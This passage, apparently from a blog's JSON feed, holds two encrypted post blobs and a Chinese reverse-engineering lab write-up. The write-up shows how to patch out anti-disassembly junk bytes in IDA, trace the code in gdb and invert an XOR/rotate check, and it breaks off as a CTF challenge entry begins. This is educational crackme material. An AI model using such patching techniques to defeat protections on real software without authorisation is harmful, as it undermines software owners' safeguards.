ec648a960c32b4140c9f0f5ecf86bafa0b210a2b0f5daafb9e7755d47f6f25627957b7e2a590a0b3b9af89e8eb96c284cc541cc46bf80bce0a7ff4cf4a1036d7483e0a37902b28ce821449c9581417234f9bac0e2fd2ab1543e80683cc1f784af27a3938870c30d2d4d0cd9c602261660f151efd3c987c1fdb561fa7d74b1d1a7f8a8d4d6875597010d82ff157bde3802f2edcd5b24df50292c68bdc996b4fb186d90fc3b0cf469a6a20c0766f43c3e64862e2d7ecb12a6517d6c4d220743000b03e0c17480cda7444e3f473074ff0bca16fd86d25ed57f4dd8f75db04c99f6a5898b6210c06144ca66ae8cf8c86c96aa1ef5c16848188f83f8a3a3bf9d4e03b044b6fddf432c3b1249b96a30bf2f18a77fee5dd73dca7abf08325b491c7fd879d21a72d338ac7d3d0fea4cf897d2126611c7dd66bbb07e087336266de964b21b4efef86e6529c5166649a65471a6604494f670fceaa8c07e33db22a53eb18c5b1c52e25a9db73fc4d0e003c64a28f4de9b641ef8e4c3fe19d927361107c43ce633efad1f3e3682b4bee2fc45cc792685d02623e7a40d7965ebfe67577aa6d4b1a0ce1a57c7aa5bf5f9a4d21e76455e9512ec9f285c80e9a595ce44215c24435efa83f360491994a43a7fa967f9f113438b037921d3e49f11c36ccfb5b373861a66fb06586b59da2d467e3fe3be988f6fc636fe9e53a7a9217cff89892d783f31c367f46746f1ea4a689e66d1ddd698f5a4443c5205b32447cc03ee50b6e2dea84adfbfd960952648b1b24fccd093e7f0787daff2f8132eb5f0d619d729f69f96405c6fba00a7e38acbc0bb6a50a8563e561c51d8d5ba091fb18c8ec330fe7212530dc813a79f189b19b545553b8d400ee9adad81cec6f5c1b7d290aa8d52e6d7cb1e024c9b1563d99867799d2679ed3251ee88c0aa213aa772515bebcbcfa028615795a6e493815167fabb93c72f9461f481f052ae0e2a6857ae6f025895484d0cf1328c2af26c730dae80337f89dd0351bbb17e62e76648258d08b0a35f945030566c556a5ec86a7b487dc6c9f48fec07abec33aff3655b0a64e4c4e5882f5e408b40d535d5756ed90a60ee4c6dd70182b583363f35e0d8dde164213848875448f36a2edb62d6c6a255a7962367d9cde04c4a34c3c9ec169cb733a3ab7634fb75c92092424ac6f12972262e59af1297315cf7cffa49208794fde142a2c2ee8daadcab36a1a29a625b76a81c92a4157fb54b4261fa5ade8c22fd5528d33fe5b4970f84ca915b97ceb8eb840891db9ab4e4a20ef78000ea2e729707dfd7e1769578080362dbf7664cfbdb52721f1990033f28d3007cc714bdd7ec7eb2f86888807e9266fa67a392ecd8737edb6d260634959db90aaebca38754931ddb3b131acbee5d616e912cfb9e53aa2a1c978b57a6e1b6ebdbb86cf4a24bb65c9bff9ce9f34b4cb66c887189bff65e8642882a358ca89a9a57987420404ef7eaf66aae6e34ef76aa0fc502b5cd268da454664e7f65d6fc20dc1d1142d319ff2501c7d9b2697e02ecfc0f0e54070b88c585c0c1c5a5d6577b393a393a37a01315b9126aae6a25f99c8272587adc26f73a3437e1cd869655a0df0efd68967c27ffd9cca19526a8bfcf2f285545898a1d072552ca634fee0c344086a49b408fcc2eae64bdcedac4deea8fb29bb24c79d5d7e2bd3e7900e98dcaa52be8a75aa8452869f200eecb12cd10d465ad42628f5d8e91082337035c9777179052fc73437960ca60bb70e6beca43629e0e7140f317b4a88b783781ac1a26229e8d26723006d6160013b4ca8e8a5a2ce5f8a8e64fde03c341004ffd15343b7477b511251d27ea4d8cbfc5a1226306d1532cdb50869c5c2d065412f65dffd9473f7d4d4e6e1cafffb8378480ef0b7468f7bb4cb2b78f5b003f740821d967eca2f5bfff12527c56d4e6a1761e2f9820e403914eeefbd150aed54ebfea4b170a5041a2c5fe7b9db25f9e61497f69227b71eebfd1d00ff25b30c280a8e27e580ae052fb26e6f15549b9e28374a87232f13499ab483496ba917591bbb7598c184497eb0afd1a8dd4c0490664236eb19f0097d4f3e8424637222cf4a7368f7b4bfc668ac08a0df1499b79184c301b8cedb51c3b882e2e6c093378256eae332fd6664ae74cf284f6c1b8592736144d410829df44e91fa776d601ad4f84fb5fbe932eb97b81cebf1600a46e943e5c84552c87df0dc9a2de09d6a2f7b3e52e3eae699b8528c6f45744e710ac8b5dbdf68bd3b5920567cbe1ae3a184ff130aed97d6be622683f31c4847c6c651da715f2ffaec70965e58639d753249d46a4a4ec79b7e98719cab28b77f771955928b601f324e58faf7ab6485e71f10af853752fa8f3b455907e097519349c392cc057845807601037824beeee8da64e8a09156eba4a3fa9673d319e012f98dcf077a0a6af5063fc647d3930841a9d213ed7bac3acfed81660ca0ec312e8cb6c5ac93228dee384b0e6ef086ace4520f09aebd764df18127f7834a7863f6b64daa217910ca0b46ad0bbb74ae4e1a7c2c46aeaf667fd3988fe6af54ca985973d2b2b5553c01403be447af31943d953d47dff390eea28a2586392628cdaf43e0f118976088d0cfcca602df053a5201a9c5666697c3971a2dcbb4682aeb209678769269ea04296963ff259dbd731d5714606335e86820e17bf48271ff7b14debded58757a12029b66413d24da3574696fd17435e0208c6dfea5528f763bd1c03a848f0b6c6296fc61404162d6777dd8d2b77d9cae6d81505304e8587bd93f303f77efb88a72f82047ae5caef4e57f542b387d7af56248abd7ea80ec8f61605b4cfd887a3e2c3c2452be23d774ab063ddd573c78386717c304e78f97429f5c9c63dae49c777a22787b84321560cbb94170d1c8471df440109eec5eadfc865b0bc9edde6de89839c2c643af078cd5d7e1e150d4c139394a764ad7c30ea3d07e1030fba685b4e598f1580a8450e8c539a65cf5da9138e1812565dd7d0be11c8fd0887d24844fe3e34862720a80eac50c8acfe08b5071f68f69ee03bee85c418502a911852d2fc5dbb4df67d2af6b6729fc5c741af5f6c9481f967921bcbfeaf3353c6f906128b6952e8cf74c65a093c7b99402b2e645311423b704b6c5b8f4c6703bb1d4be524219eb1687435507d7def3b524cd2e0cbdd799f29fc744f1955814831e1fa73d99c05bdbf83826cc5ce1cf7eaff528ce1ea5cb816a4a58a470c54777e7d5ca256d84267489fb4bfa475a5c8d68b21ffc72d76539893717fdf1fead18135ead1c788d7f6d6fa7bd9113eaae9618cdd9efd2b0775533a1dd3f46960fa3517c6e45b5ec10a1fb1abd3c2621041a8aca3471282e35798e42dadc4418a607b741fa3008f7e4cb57e4d96b14dc70d723b4cb2ff340c15655473a8b7d4ae97c9c1602fd853ea98d6f3632044de4402ae1191651c9fe14a27206f86ff129f15719e9d038f2c424a6d7dcf2c11ab2384103b6d8c2c90ee5dc1a04e7973d25bfec9a737c765c7ff5f9efb5d2b05b3d2d37ac96f59aa91f4e7821a7b3f0788713df889fa7a096bd4d3aed6d43f856d3a76c8c8cd04496ee1633146b75a0095a52611fabeef61d3e68f3cc7e107efee7e61aab9f6622de6c253d71c2753a8f909e26b5a58f78a9cbc820e6857583168aa5d460fc1ca94cb417f103745fa636096937f0b7ff31fc76827b1c26a63ecff2032c6c7c71040045048389d4d1f1f95d0d0d1b05d0c2cfeac7fa390ae59b106f009bcdae2394e70ed3be4cd3fc26648c87349ffcec5eeb015b9f7eb33959f663da75255b77417f5ea61d6552a8d7c9f124f837706b33d4ba1fabe6bd3c9cd80f5bc83237a824bc445115f91ec9ccf5f6d771549c5c8dfeb413c4f907d7ce00de13d9063451174d33547e3fcd0277d6d5ab1f8a998e122c51ea0430f4a94642cfd48db0a63ea9a5a476bb41f78af5ef81e495b750ece643347ebc5184f497ca4ff7b06c1dd419a76a9e587b9e77db2b19f0ec54b0b5a5756c068e3eea2623b99c3971e7566957aaf7cdf4dd5584930ecf9264b01af8da8e4bbc9d98573982a488619b65a82264e9822912ada103c31d23629753c91781885fc460788491e3534dc7fde3b9825fc984cc9d418cd19cda4ac74b337e7b3ec0ab83a01bedd4606ad303970b15c0e010afd1a592a9db2b0a016b4ef3f126997146c8695d904817826020ecc548bee0295548c2c5e8b1682c071ade25ab57b64dbd4e5fb8aa7aba660540e62c979f4e9dc2b0b5751c9dd23dddb950b18c88ddae9704a0c3a556035c10a656906452e93e5ed9bebe33ebf2d587167a7f1b3c861d3ab270351800ff7b18b1601c90fbab084c8454d0a510c810dcace33f80cd58fa25dc238f9740fc72696f82bd86c3df222b02afc6679c4a4c1d3a3b468b59b6d9917bbabdc673bc686737d06b96e07d7a4256e40644aa12f3b9ccb909fa579370c54d406dd8b6e226547e6b693d5a4c22bd8d44a681504890a4d4bdcd217e0c034ced143f4fbdd198d6d66395c94b9da73b7113aacbd8c6153aaceadbf601102ec4f603e436b81d9aa6ab80ae7621e119305abe00f7704367d3c9d638b04b34a260b7ce690a83838354715a523beacb3562d86b3cf6ed8ab2b48d6edba2a8196018f9ed16b042a55f09a5e6a368e6ef7e74d0bb3d55f82344359aa30b20141f6eeaf6e7e0bf6719a2ee9e9c82d3a08512f2e19502ec49eb791ea527e9a5ea2f63edb1b783fd98dc7a360e1f06cd271bdb1b6651040a26da6f669c31e82b6529f35eda657fa0afff43b2f72663a061d2f000a676e449a5b77797feb05e5142840069d0fb2727ef5d03948256a80bbbf2864259a4747716ca7c59d078d7c318ddebf89eba4f7c1faf5f831d6ec070fa71280b4b970700697972f4b49839571bdf38005449e36f50a7c2b7abe709e82b970149dfffbe0770bca3ac99d785ef63031cf8adaf0db4a8f0cb8268ca0c51ba7be64c9f8e726ddd3f660a0ff0fd401fd31158f5c2a967aeb9c51ece84f7eec61b8b6a7b4f8619daacabdf06d83519e19b392b22aa62afc3a35f1f83c8d94b52968d6824eb99a7bb469fdc9b443506deb4b509b25c75564667db80af65e2e334e91811a6637c03c0bd68573e356afec6e3d67052d61b8a5b59ad8e488789204189a7e1c83cf7fae23aadb6ee16405a3025beb9446b468ef67c955660f213d9bae2904e180cf2049d2372e1771d7215ab141eaa8f8915eaed14dcaef705dddc748a236504a62f4d9744d55f6442267fc30e48db5dcb9dd91d4fe6009689cfc94390b5efbf7e5687db6cd20e824d0b26ae282538ce0bc469e3e6e36fb3042043e1e8e6b0263c0d1721df83d8cdf75cc4f06d240375e3bd9517bf372f89e2526d64fcfd331c17c8e56af30541c4d30d23c197d309eea84367c8bd25f625be36a4b74e42ae24e35ab5c4007af113df0ad43eb901a90336863e125a116342ecdf52988e5f94d11841f674120b38434e6f3490b04dabedbaaa829e993aec2d3159887bbba080971eccfb20f30e13d15924cd747681436ffa57df232a3b8df3aea7d0744db8a8ce9a060c2132dc3f2f1d0fef3c50125a9efcae49e8873bb5bb9239bce6d15aae3bd585868fc38e47893bcbfb730a942f4b72f8ba85fbbcc864f8cd9fbfeebf90571cea5448ec4316d46c6d4ca1ec5dc1adb5e6bc68e6af188a5187b25597bdaacbe3c98db515b2cabe4654e35319a5923b8fdc98e369c17cc429af6db69bc79de4c9eac2d90cb402e9c1834f4e7425db33a51772aa41db06c982456240f3d8a2ccc70caeecdc686f71f63e4ea0415a8b77a942d15133582b07e4dc2ecccd3d6be4512184ac21c3ddcec05c0cb8b343a3bc13b807838103cd1fa126ded04e3e2bae78766bd6d88ef223a4f98fefa8c71715c0cffddb1d44834ed78068b07c39f31f953a391bf45c87cfbda7a0cb05bb8ae8f63895590a7a06cab0b498afc405a63ad409ab3fc799caff0a17e88711f09413271c98b5</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-20-pwn-college-UAF%E5%8F%8Atcache/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-20-pwn-college-UAF%E5%8F%8Atcache/",
            "title": "pwn入门-20-pwn.college-UAF及tcache",
            "date_published": "2023-03-13T07:12:24.000Z",
            "content_html": "<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"421df2e0c365a1d8fba4ed229382fa53255cde9c20bc8d82027380ff7ee6987d\">757d6246220447313784a310f701cd401fb2b1a545efaab207cb22606a616648dce83e31935e07c038d5318312eaf48212207018a1e312f166cabc16419929bd145ba153f22c084516d022044e26141aa82d476546849ee368eef75b9597e23c92a32019c8195ada1008a60d640feeaa</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/",
            "url": "https://tangzichengcc.github.io/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/",
            "title": "ucas-高级网络攻防-实验一_逆向",
            "date_published": "2023-03-10T11:18:16.000Z",
            "content_html": "<p>[toc]</p>\n<h1 id=\"加花指令程序分析\"><a href=\"#加花指令程序分析\" class=\"headerlink\" title=\"加花指令程序分析\"></a>加花指令程序分析</h1><p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/image-20230310191852772.png\" alt=\"image-20230310191852772\"></p>\n<h2 id=\"程序功能\"><a href=\"#程序功能\" class=\"headerlink\" title=\"程序功能\"></a>程序功能</h2><p>​\t\t根据解除花指令,反编译后的代码分析可知,该程序获取用户的一个输入,然后对该输入进行三次运算,每一次都是先将输入与0x1453异或,然后左移一位,得到最后的结果. 如果这个结果等于50138则输出win.</p>\n<h2 id=\"花指令分析\"><a href=\"#花指令分析\" class=\"headerlink\" title=\"花指令分析\"></a>花指令分析</h2><p>首先,在函数列表里没有main函数,但是汇编里面有,说明main函数没有被正确反汇编,这里有问题,</p>\n<p>在main前面按p解析函数发现报错,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">.text:0000000000001257: The function has undefined instruction/data at the specified address.</span><br><span class=\"line\">Your request has been put in the autoanalysis queue.</span><br><span class=\"line\"></span><br><span class=\"line\">.text:0000000000001253                 jz      short label2</span><br><span class=\"line\">.text:0000000000001255                 jnz     short label2</span><br><span class=\"line\">.text:0000000000001255 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:0000000000001257                 db 0E9h</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以发现前面有 jz和jnz,肯定不会执行到1257,1257这里是花指令,改成nop即可</p>\n<p>edit - patch program - change word 把E9 改成90 (0x90也就是nop,什么也不执行,往下走 即可)</p>\n<p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/image-20230310193522710.png\" alt=\"image-20230310193522710\"></p>\n<p>此时这里还是代表数据,用快捷键c转换成代码,然后再在开头用p转换成函数即可</p>\n<p>然后就可以F5反编译</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Input a number: &quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v4);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)encrypt(v4) == <span class=\"number\">50138</span> )</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;win&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以开到,关键函数是encrypt,进入这里,发现这里面也有问题,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __fastcall <span class=\"title function_\">encrypt</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 &gt; <span class=\"number\">0x1000</span> )</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  JUMPOUT(<span class=\"number\">0x11EC</span>LL);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">.text:<span class=\"number\">00000000000011</span>EB                         loc_11EB:                               ; CODE XREF: encrypt+<span class=\"number\">58</span>↓j</span><br><span class=\"line\">.text:<span class=\"number\">00000000000011</span>EB                                                                 ; encrypt:loc_11EB↑j</span><br><span class=\"line\">.text:<span class=\"number\">00000000000011</span>EB EB FF                                   jmp     <span class=\"type\">short</span> near ptr loc_11EB+<span class=\"number\">1</span> ; Jump</span><br><span class=\"line\">.text:<span class=\"number\">00000000000011</span>ED                         ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:<span class=\"number\">00000000000011</span>ED C0 FF C8                                sar     bh, <span class=\"number\">0</span>C8h        ; Shift Arithmetic Right</span><br><span class=\"line\">.text:<span class=\"number\">00000000000011F</span>0 <span class=\"number\">8B</span> <span class=\"number\">45</span> FC                                mov     eax, [rbp+var_4]</span><br><span class=\"line\">.text:<span class=\"number\">00000000000011F</span>3 <span class=\"number\">31</span> <span class=\"number\">45</span> EC                                xor     [rbp+var_14], eax ; Logical Exclusive OR</span><br><span class=\"line\">.text:<span class=\"number\">00000000000011F</span>6 D1 <span class=\"number\">45</span> EC                                rol     [rbp+var_14], <span class=\"number\">1</span> ; Rotate Left</span><br><span class=\"line\">.text:<span class=\"number\">00000000000011F</span>9 <span class=\"number\">83</span> <span class=\"number\">45</span> F8 <span class=\"number\">01</span>                             add     [rbp+var_8], <span class=\"number\">1</span>  ; Add</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t通过gdb动态调试发现, jmp     short near ptr loc_11EB+1  是要跳到00000000000011EC这里,(动态运行的话是0x5555555551ec,要加上装载地址),然后往下解析, 但是在ida里面,由于这条指令的存在,它会从00000000000011ED往后解析,(不太清楚这里面的机制原理),而jump到000011EC这里就jump错了地址,所以反编译有问题.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"number\">0x5555555551fd</span> &lt;encrypt+<span class=\"number\">84</span>&gt;    cmp    dword ptr [rbp - <span class=\"number\">8</span>], <span class=\"number\">2</span></span><br><span class=\"line\">  <span class=\"number\">0x555555555201</span> &lt;encrypt+<span class=\"number\">88</span>&gt;    jle    encrypt+<span class=\"number\">66</span>                &lt;encrypt+<span class=\"number\">66</span>&gt;</span><br><span class=\"line\">   ↓</span><br><span class=\"line\">  <span class=\"number\">0x5555555551eb</span> &lt;encrypt+<span class=\"number\">66</span>&gt;    jmp    encrypt+<span class=\"number\">67</span>                &lt;encrypt+<span class=\"number\">67</span>&gt;</span><br><span class=\"line\">   ↓</span><br><span class=\"line\">► <span class=\"number\">0x5555555551ec</span> &lt;encrypt+<span class=\"number\">67</span>&gt;    inc    eax</span><br><span class=\"line\">  <span class=\"number\">0x5555555551ee</span> &lt;encrypt+<span class=\"number\">69</span>&gt;    dec    eax</span><br><span class=\"line\">  <span class=\"number\">0x5555555551f0</span> &lt;encrypt+<span class=\"number\">71</span>&gt;    mov    eax, dword ptr [rbp - <span class=\"number\">4</span>]</span><br><span class=\"line\">  <span class=\"number\">0x5555555551f3</span> &lt;encrypt+<span class=\"number\">74</span>&gt;    xor    dword ptr [rbp - <span class=\"number\">0x14</span>], eax</span><br><span class=\"line\">  <span class=\"number\">0x5555555551f6</span> &lt;encrypt+<span class=\"number\">77</span>&gt;    rol    dword ptr [rbp - <span class=\"number\">0x14</span>], <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"number\">0x5555555551f9</span> &lt;encrypt+<span class=\"number\">80</span>&gt;    add    dword ptr [rbp - <span class=\"number\">8</span>], <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t所以要想解决的话,有多个办法,一个是,jmp 到0000011ED就可以了,将FF改成00,也就再往前走一步,这样就可以了,第二个办法是都改成nop就可以了,让指令往下滑.</p>\n<p>​\t\t反编译结果</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __fastcall <span class=\"title function_\">encrypt</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v1; <span class=\"comment\">// bh</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+14h] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+20h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = a1;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 &gt; <span class=\"number\">0x1000</span> )</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">2</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v1 &gt;&gt;= <span class=\"number\">7</span>;</span><br><span class=\"line\">    v2 = __ROL4__(v2 ^ <span class=\"number\">0x1453</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\ta1是输入的值,首先a1不能大于4096, 然后v1右移7位,v2 等于 v2和0x1453异或后 左移1位,( rol    dword ptr [rbp - 0x14], 1)</p>\n<p>​\t\t最后的结果是50138,逆向推导,右移一位,异或0x1453,这个操作做三次,就得到了答案789</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> input = <span class=\"number\">50138</span>;</span><br><span class=\"line\">  input &gt;&gt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">  input = input ^ <span class=\"number\">0x1453</span>;</span><br><span class=\"line\">  input &gt;&gt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">  input = input ^ <span class=\"number\">0x1453</span>;</span><br><span class=\"line\">  input &gt;&gt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">  input = input ^ <span class=\"number\">0x1453</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d&quot;</span>,input);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"运行截图\"><a href=\"#运行截图\" class=\"headerlink\" title=\"运行截图\"></a>运行截图</h2><p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/image-20230310200841386.png\" alt=\"image-20230310200841386\"></p>\n<h1 id=\"re1-asm\"><a href=\"#re1-asm\" class=\"headerlink\" title=\"re1 asm\"></a>re1 asm</h1><p>​\t\t得到一个asm.s文件,汇编文件,查看可以知道是由test.c汇编而来,可以选择硬读汇编来解,也可以进行编译成二进制文件后,再反汇编反编译成伪代码进行查看.</p>\n<p>​\t\tgcc asm.s 得到二进制文件 a.out,然后拖进ida进行反编译,得到结果</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a == <span class=\"number\">29488</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;you win&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;you lose&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"re2-bits\"><a href=\"#re2-bits\" class=\"headerlink\" title=\"re2 bits\"></a>re2 bits</h1><h2 id=\"概要\"><a href=\"#概要\" class=\"headerlink\" title=\"概要\"></a>概要</h2><p>​\t\t这是一道ctf的逆向题目,给了二进制文件和远程服务器连接方式.二进制文件是elf 